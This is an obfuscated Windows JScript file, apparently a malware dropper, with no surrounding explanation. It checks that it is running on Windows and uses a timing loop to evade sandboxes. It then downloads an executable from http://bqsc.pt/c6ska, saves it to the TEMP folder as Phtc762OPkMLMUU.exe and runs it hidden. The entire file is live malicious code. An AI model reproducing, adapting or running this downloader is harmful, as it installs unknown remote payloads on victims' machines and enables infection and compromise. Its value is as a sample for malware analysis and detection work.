var _MN = false;
var _MO = "CreateObject";
var _C = function _ZT() {return WScript[_MO]("WScript"+".Shell");}(), _V = 11;
var _D = "MSXML2.XMLHTTP";
var _H0 = 2123213;
var _LV0 = 0;
function _QW(_L){_C["Run"](_L, _LV0, _LV0);};
function _SK(){return _D + "";};
function _WF(_OY, _G){_LV0 = _LV0 * 1; return _OY - _G;};
function _I(){return _MO;};
/*@cc_on
  @if (@_win32 || @_win64)
    _MN = true;
  @end
@*/
if (_MN)
{
var _B0 = "";
function _LV(){return 22;};
var _I0 = 0; var _J = 0;
function _W()
{
var _WL = new this["Date"]();
var _NT = _WL["getUTCMilliseconds"]();
WScript["Sleep"](_LV());
var _WL = new this["Date"]();
var _RC = _WL["getUTCMilliseconds"]();
WScript["Sleep"](_LV());
var _WL = new this["Date"]();
var _TN = _WL["getUTCMilliseconds"]();
var _I0 = "_F";
_I0 = _WF(_RC, _NT);
var _J = "_TO";
_J = _WF(_TN, _RC);
_B0 = "open";
return _WF(_I0, _J);
}
var _Z = false;
var _TI = false;
for (var _S = _LV0; _S < _LV() * 1; _S++){if (_W() != _LV0){
_Z = true; 
_J = "31" + 11 * _I0 + _J; 
_TI = true; 
break;
}}
function _B() {return ((_Z == true) && (_Z == _TI)) ? 1 : _LV0;};
if (_Z && _B() && _TI){
function _N() {return _C["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Phtc762OPkMLMUU.ex" + "e";};
 _HO = _SK();
 _Y = WScript[_MO](_HO);
 var _QB = 1;
 while (_QB){
try {
	if (_QB == 1)
	{
		_Y[_B0]("GET", "http://bqsc.pt/c6ska", false);
		_Y["send"]();
		_H = "Sleep";
	}
	WScript[_H](_LV() + 120); 
	if (_Y["readystate"] < 2 * 2) continue;
	_QB = _LV0;
	function _OJ(_U) {var _E = (1, 2, 3, 4, 5, _U); return _E;};
	_MH = WScript[_I()]("ADODB.Stream");
	_HO = _MH;
	_HO[_B0]();
	_HO["type"] = _OJ(1);
	_HO["write"](_Y["ResponseBody"]);
	_MH["position"] = _OJ(_LV0);
	_HO["Save" + "ToFile"](_N(), 2);
	_MH["cl"+"ose"]();
	_X = _N();
	_QW(_X);
} catch(_A){};
}
}
}

